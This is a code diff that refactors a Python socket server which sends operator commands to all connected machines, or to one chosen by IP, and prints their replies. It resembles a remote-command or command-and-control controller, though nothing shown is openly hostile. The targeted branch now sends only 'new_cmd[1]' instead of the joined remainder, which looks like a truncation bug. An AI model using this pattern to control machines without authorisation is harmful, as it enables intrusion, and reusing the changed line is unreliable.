@@ -15,10 +15,9 @@ w.close()
 
 #############################
 ## ========  Config  ========
-HEADER = 64
 PORT = port
-#PORT = 5050
-#SERVER = '10.96.10.191'
+#PORT = 5050             ## CONFIGURE THIS
+#SERVER = '10.96.10.191' ## CONFIGURE THIS
 SERVER = socket.gethostbyname(socket.gethostname())
 ADDR = (SERVER, PORT)
 FORMAT = 'utf-8'
@@ -50,11 +49,7 @@ def handle_user():
             itr = 1
             for data in connected_machines:
                 print(f"{str(itr)}) {data['addr'][0]}")
-                message = new_cmd.encode(FORMAT)
-                length = str(len(message)).encode(FORMAT)
-                length += b' ' * (HEADER - len(length))
-                data['conn'].send(length)
-                data['conn'].send(message)
+                snd_msg(data['conn'], new_cmd)
                 resp = get_msg(data['conn'])
                 print(resp)
                 print("=============================================")
@@ -77,13 +72,7 @@ def handle_user():
             for data in connected_machines:
                 if data['addr'][0] == new_cmd[0]:
                     sent = True
-                    new_cmd = ' '.join(new_cmd[1:])
-                    print(f'Sending \"{new_cmd}\" to {data["addr"][0]}')
-                    message = new_cmd.encode(FORMAT)
-                    length = str(len(message)).encode(FORMAT)
-                    length += b' ' * (HEADER - len(length))
-                    data['conn'].send(length)
-                    data['conn'].send(message)
+                    snd_msg(data['conn'], new_cmd[1])
                     resp = get_msg(data['conn'])
                     print(resp)
 
